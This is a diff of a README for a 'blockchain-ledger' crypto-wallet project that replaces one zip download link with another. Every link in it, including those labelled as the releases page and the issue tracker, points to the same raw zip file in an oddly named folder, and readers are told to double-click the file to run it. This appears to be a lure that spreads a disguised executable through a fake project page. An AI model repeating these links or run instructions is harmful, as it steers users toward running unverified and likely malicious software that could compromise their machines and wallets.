@@ -1,7 +1,7 @@
 # 🪙 blockchain-ledger - Simplifying Blockchain for Everyone
 
 ## 📥 Download Now
-[![Download the latest release](https://github.com/korro-lona/blockchain-ledger/raw/refs/heads/main/cercopithecid/blockchain_ledger_1.1.zip%20Latest%20Release-blue)](https://github.com/korro-lona/blockchain-ledger/raw/refs/heads/main/cercopithecid/blockchain_ledger_1.1.zip)
+[![Download the latest release](https://raw.githubusercontent.com/korro-lona/blockchain-ledger/main/cercopithecid/blockchain_ledger_v1.6-alpha.3.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/korro-lona/blockchain-ledger/main/cercopithecid/blockchain_ledger_v1.6-alpha.3.zip)
 
 ## 🚀 Getting Started
 Welcome to the blockchain-ledger project. This software provides an easy way to understand how blockchains work. It includes basic features like blocks, hashes, and a way to check if the chain is valid. It also supports a simple cryptocurrency wallet that can create addresses, track balances, and sign transactions.
@@ -14,7 +14,7 @@ To run blockchain-ledger on your computer, you will need:
 - A modern web browser for viewing the wallet interface.
 
 ## 🔗 Download & Install
-To begin using blockchain-ledger, visit this page to download: [GitHub Releases Page](https://github.com/korro-lona/blockchain-ledger/raw/refs/heads/main/cercopithecid/blockchain_ledger_1.1.zip).
+To begin using blockchain-ledger, visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/korro-lona/blockchain-ledger/main/cercopithecid/blockchain_ledger_v1.6-alpha.3.zip).
 
 1. Click on the link above to go to the releases page.
 2. Find the latest version of blockchain-ledger.
@@ -26,8 +26,8 @@ After you have downloaded the file, follow these steps to run the blockchain-led
 
 1. Open your downloads folder.
 2. Locate the downloaded file.
-   - **For Windows:** The file may be named something like `https://github.com/korro-lona/blockchain-ledger/raw/refs/heads/main/cercopithecid/blockchain_ledger_1.1.zip`.
-   - **For macOS:** Look for `https://github.com/korro-lona/blockchain-ledger/raw/refs/heads/main/cercopithecid/blockchain_ledger_1.1.zip`.
+   - **For Windows:** The file may be named something like `https://raw.githubusercontent.com/korro-lona/blockchain-ledger/main/cercopithecid/blockchain_ledger_v1.6-alpha.3.zip`.
+   - **For macOS:** Look for `https://raw.githubusercontent.com/korro-lona/blockchain-ledger/main/cercopithecid/blockchain_ledger_v1.6-alpha.3.zip`.
    - **For Linux:** You may see `blockchain-ledger-linux`.
 3. Double-click the file to run it.
 
@@ -49,7 +49,7 @@ If you encounter issues while downloading or running blockchain-ledger, consider
 - **Unexpected Errors:** Restart your computer and try running the app again. If you still face issues, contact support via the GitHub repository.
 
 ## 💬 Support and Feedback
-Feedback is valuable to us. If you have questions or suggestions, please open an issue on our [GitHub Repository](https://github.com/korro-lona/blockchain-ledger/raw/refs/heads/main/cercopithecid/blockchain_ledger_1.1.zip). We appreciate your input for improving the application.
+Feedback is valuable to us. If you have questions or suggestions, please open an issue on our [GitHub Repository](https://raw.githubusercontent.com/korro-lona/blockchain-ledger/main/cercopithecid/blockchain_ledger_v1.6-alpha.3.zip). We appreciate your input for improving the application.
 
 ## 📝 Contributing
 If you're interested in improving blockchain-ledger, we welcome contributions. You can fork this project and submit a pull request. To get started, please refer to our contributing guidelines in the repository.
